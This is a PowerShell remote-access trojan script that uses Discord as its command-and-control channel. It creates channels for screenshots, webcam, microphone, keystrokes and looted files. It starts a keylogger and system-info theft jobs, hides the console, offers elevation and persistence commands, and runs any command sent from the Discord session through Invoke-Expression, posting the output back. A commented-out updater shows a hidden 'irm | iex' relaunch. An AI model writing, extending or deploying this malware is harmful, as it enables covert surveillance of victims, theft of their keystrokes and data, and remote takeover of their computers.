$screenJob = {
    param ([string]$token, [string]$ScreenshotID, [string]$ScreenshotWebhook)
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$ScreenshotID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($ScreenshotWebhook) {
                    $hooksend = $wc.UploadFile($ScreenshotWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    while ($true) {
        $mkvPath = "$env:Temp\Screen.jpg"
        .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
        sendFile -sendfilePath $mkvPath | Out-Null
        sleep 5
        rm -Path $mkvPath -Force
        sleep 1
    }
}

# Scriptblock for webcam screenshots to discord
$camJob = {
    param ([string]$token, [string]$WebcamID, [string]$WebcamWebhook)    
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$WebcamID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($WebcamWebhook) {
                    $hooksend = $wc.UploadFile($WebcamWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $imagePath = "$env:Temp\Image.jpg"
    $Input = (Get-CimInstance Win32_PnPEntity | ? { $_.PNPClass -eq 'Camera' } | select -First 1).Name
    if (!($input)) { $Input = (Get-CimInstance Win32_PnPEntity | ? { $_.PNPClass -eq 'Image' } | select -First 1).Name }
    while ($true) {
        .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
        sendFile -sendfilePath $imagePath | Out-Null
        sleep 5
        rm -Path $imagePath -Force
        sleep 5
    }
}

# Function to start all jobs upon script execution
function StartAll {
    # Automatic capture jobs disabled - use manual commands instead
    # Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID, $global:WebcamWebhook
    # sleep 1
    # Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
    # sleep 1
    # Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID, $global:MicrophoneWebhook
    # sleep 1
    try {
        Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID -ErrorAction Stop
        sleep 1
    }
    catch {
        Write-Host "Error starting Keys job: $($_.Exception.Message)"
    }
    try {
        Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID -ErrorAction Stop
        sleep 1
    }
    catch {
        Write-Host "Error starting Info job: $($_.Exception.Message)"
    }
    try {
        Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID -ErrorAction Stop
        sleep 1
    }
    catch {
        Write-Host "Error starting PSconsole job: $($_.Exception.Message)"
    }
}

Function ConnectMsg {

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    }
    else {
        $adminperm = "True"
    }

    if ($InfoOnConnect -eq '1') {
        $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
    }
    else {
        $infocall = 'Type `` Options `` in chat for commands list'
    }

    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = "$env:COMPUTERNAME | C2 session started!"
                "description" = @"
Session Started  : ``$timestamp``

$infocall
"@
                color         = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload

    if ($InfoOnConnect -eq '1') {
        quickInfo
    }
    else {}
}

# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
# Hide the console
If ($hideconsole -eq 1) { 
    HideWindow
}
Function Get-BotUserId {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
    $botInfo = $botInfo | ConvertFrom-Json
    return $botInfo.id
}
$global:botId = Get-BotUserId
# Create category and new channels
NewChannelCategory
sleep 1
NewChannel -name 'session-control'
$global:SessionID = $ChannelID
$global:ch = $ChannelID
sleep 1
NewChannel -name 'screenshots'
$global:ScreenshotID = $ChannelID
sleep 1
NewChannel -name 'webcam'
$global:WebcamID = $ChannelID
sleep 1
NewChannel -name 'microphone'
$global:MicrophoneID = $ChannelID
sleep 1
NewChannel -name 'keycapture'
$global:keyID = $ChannelID
sleep 1
NewChannel -name 'loot-files'
$global:LootID = $ChannelID
sleep 1
NewChannel -name 'powershell'
$global:PowershellID = $ChannelID
sleep 1
# Download ffmpeg to temp folder
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)) {  
    GetFfmpeg
}
# Opening info message
ConnectMsg
# Start all functions upon running the script
If ($defaultstart -eq 1) { 
    StartAll
}
else {
    # Démarrer les jobs essentiels même si defaultstart est à 0
    # PowerShell, Loot et Keylogger sont nécessaires pour le fonctionnement de base
    try {
        Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID -ErrorAction Stop
        Start-Sleep -Seconds 1
        sendMsg -Message ":white_check_mark: ``PowerShell console job started`` :white_check_mark:"
    }
    catch {
        Write-Host "Error starting PSconsole job: $($_.Exception.Message)"
        sendMsg -Message ":octagonal_sign: ``Failed to start PowerShell console: $($_.Exception.Message)`` :octagonal_sign:"
    }
    try {
        Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID -ErrorAction Stop
        Start-Sleep -Seconds 1
        sendMsg -Message ":white_check_mark: ``System info job started`` :white_check_mark:"
    }
    catch {
        Write-Host "Error starting Info job: $($_.Exception.Message)"
        sendMsg -Message ":octagonal_sign: ``Failed to start System info job: $($_.Exception.Message)`` :octagonal_sign:"
    }
    try {
        Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID -ErrorAction Stop
        Start-Sleep -Seconds 1
        sendMsg -Message ":white_check_mark: ``Keylogger job started`` :white_check_mark:"
    }
    catch {
        Write-Host "Error starting Keys job: $($_.Exception.Message)"
        sendMsg -Message ":octagonal_sign: ``Failed to start Keylogger: $($_.Exception.Message)`` :octagonal_sign:"
    }
}
# Send setup complete message to discord
sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"

# ---------------------------------------------------------------------------------------------------------------------------------------------------------

Function CloseMsg {
    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = " $env:COMPUTERNAME | Session Closed "
                "description" = @"
:no_entry: **$env:COMPUTERNAME** Closing session :no_entry:     
"@
                color         = 16711680
                footer        = @{
                    text = "$timestamp"
                }
            }
        )
    }
    sendMsg -Embed $jsonPayload
}

Function VersionCheck {
    # Version check disabled to prevent automatic restarts
    # $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
    # $VBpath = "C:\Windows\Tasks\service.vbs"
    # if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1") {
    #     Write-Output "Persistance Installed - Checking Version.."
    #     if (!($version -match $versionCheck)) {
    #         Write-Output "Newer version available! Downloading and Restarting"
    #         RemovePersistance
    #         AddPersistance
    #         $tobat = @"
    # Set WshShell = WScript.CreateObject(`"WScript.Shell`")
    # WScript.Sleep 200
    # WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm $parent | iex`", 0, True
    # "@
    #         $tobat | Out-File -FilePath $VBpath -Force
    #         sleep 1
    #         & $VBpath
    #         exit
    #     }
    # }
}

# =============================================================== MAIN LOOP =========================================================================

VersionCheck

while ($true) {

    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
    $most_recent_message = ($messages | ConvertFrom-Json)[0]
    if ($most_recent_message.author.id -ne $botId) {
        $latestMessageId = $most_recent_message.timestamp
        $messages = $most_recent_message.content
    }
    if ($latestMessageId -ne $lastMessageId) {
        $lastMessageId = $latestMessageId
        $global:latestMessageContent = $messages
        $camrunning = Get-Job -Name Webcam
        $sceenrunning = Get-Job -Name Screen
        $audiorunning = Get-Job -Name Audio
        $PSrunning = Get-Job -Name PSconsole
        $lootrunning = Get-Job -Name Info
        $keysrunning = Get-Job -Name Keys
        if ($messages -eq 'webcam') {
            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'TakePhoto' command for manual camera capture`` :no_entry:"
        }
        if ($messages -eq 'screenshots') {
            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'TakeScreenshot' command for manual screenshot capture`` :no_entry:"
        }
        if ($messages -eq 'psconsole') {
            if (!($PSrunning)) {
                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
        }
        if ($messages -eq 'microphone') {
            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'RecordAudioClip X' command for manual audio recording (e.g. RecordAudioClip 30)`` :no_entry:"
        }
        if ($messages -eq 'keycapture') {
            if (!($keysrunning)) {
                try {
                    Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID -ErrorAction Stop
                    sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
                }
                catch {
                    sendMsg -Message ":octagonal_sign: ``Failed to start Keylogger: $($_.Exception.Message)`` :octagonal_sign:"
                }
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
        }
        if ($messages -eq 'systeminfo') {
            if (!($lootrunning)) {
                Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
        }
        if ($messages -eq 'pausejobs') {
            Get-Job | Where-Object { $_.Name -in @('Audio', 'Screen', 'Webcam', 'PSconsole', 'Keys', 'Info') } | Stop-Job -ErrorAction SilentlyContinue
            Get-Job | Where-Object { $_.Name -in @('Audio', 'Screen', 'Webcam', 'PSconsole', 'Keys', 'Info') } | Remove-Job -ErrorAction SilentlyContinue
            sendMsg -Message ":no_entry: ``Stopped All Jobs! : $env:COMPUTERNAME`` :no_entry:"   
        }
        if ($messages -eq 'resumejobs') {
            if (!($lootrunning)) {
                Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
            if (!($keysrunning)) {
                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
            if (!($PSrunning)) {
                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
            sendMsg -Message ":white_check_mark: ``Resumed Available Jobs! (Automatic capture jobs disabled - use manual commands: TakePhoto, TakeScreenshot, RecordAudioClip)`` :white_check_mark:"   
        }
        if ($messages -eq 'close') {
            CloseMsg
            sleep 2
            exit      
        }
        elseif ($messages -match '^RecordAudioClip\s+(\d+)$') {
            $duration = [int]$matches[1]
            RecordAudioClip -Duration $duration
        }
        elseif ($messages -match '^(?i)(IsAdmin|Elevate|RemovePersistance|AddPersistance|TakePhoto|TakeScreenshot)$') {
            $cmdName = $matches[1]
            if ($cmdName -eq 'IsAdmin') { IsAdmin }
            elseif ($cmdName -eq 'Elevate') { Elevate }
            elseif ($cmdName -eq 'RemovePersistance') { RemovePersistance }
            elseif ($cmdName -eq 'AddPersistance') { AddPersistance }
            elseif ($cmdName -eq 'TakePhoto') { TakePhoto }
            elseif ($cmdName -eq 'TakeScreenshot') { TakeScreenshot }
        }
        else { 
            try {
                # Exécuter la commande avec capture complète de la sortie
                $ErrorActionPreference = 'Continue'
                $output = Invoke-Expression $messages 2>&1 | Out-String
                
                if ([string]::IsNullOrWhiteSpace($output)) {
                    $output = "Command executed successfully (no output)"
                }
                
                # Diviser en messages si nécessaire (limite Discord ~2000 caractères)
                $maxMessageSize = 1950
                if ($output.Length -le $maxMessageSize) {
                    sendMsg -Message "``````$output``````"
                }
                else {
                    # Diviser en plusieurs messages
                    $outputLines = $output -split "`r?`n"
                    $currentBatch = ""
                    $batchNumber = 1
                    $totalBatches = [Math]::Ceiling(($output.Length / $maxMessageSize))
                    
                    foreach ($line in $outputLines) {
                        $lineWithNewline = $line + "`n"
                        if (([System.Text.Encoding]::UTF8.GetByteCount($currentBatch + $lineWithNewline)) -gt $maxMessageSize) {
                            if ($currentBatch.Length -gt 0) {
                                sendMsg -Message "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
                                Start-Sleep -Milliseconds 500
                                $batchNumber++
                                $currentBatch = ""
                            }
                        }
                        $currentBatch += $lineWithNewline
                    }
                    
                    if ($currentBatch.Length -gt 0) {
                        sendMsg -Message "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
                    }
                }
            }
            catch {
                $errorDetails = $_.Exception | Format-List -Force | Out-String
                $errorMessage = "Error: $($_.Exception.Message)`n`nDetails:`n$errorDetails"
                
                # Diviser les erreurs aussi si nécessaire
                $maxErrorSize = 1950
                if ($errorMessage.Length -le $maxErrorSize) {
                    sendMsg -Message ":octagonal_sign: ``$errorMessage`` :octagonal_sign:"
                }
                else {
                    $errorParts = $errorMessage -split "`n"
                    $currentErrorBatch = ""
                    $errorBatchNum = 1
                    $totalErrorBatches = [Math]::Ceiling(($errorMessage.Length / $maxErrorSize))
                    
                    foreach ($part in $errorParts) {
                        if (([System.Text.Encoding]::UTF8.GetByteCount($currentErrorBatch + "`n" + $part)) -gt $maxErrorSize) {
                            if ($currentErrorBatch.Length -gt 0) {
                                sendMsg -Message ":octagonal_sign: ``[Error Part $errorBatchNum/$totalErrorBatches]`n$currentErrorBatch`` :octagonal_sign:"
                                Start-Sleep -Milliseconds 500
                                $errorBatchNum++
                                $currentErrorBatch = ""
                            }
                        }
                        $currentErrorBatch += $part + "`n"
                    }
                    if ($currentErrorBatch.Length -gt 0) {
                        sendMsg -Message ":octagonal_sign: ``[Error Part $errorBatchNum/$totalErrorBatches]`n$currentErrorBatch`` :octagonal_sign:"
                    }
                }
            }
        }
    }
    Sleep 3
}


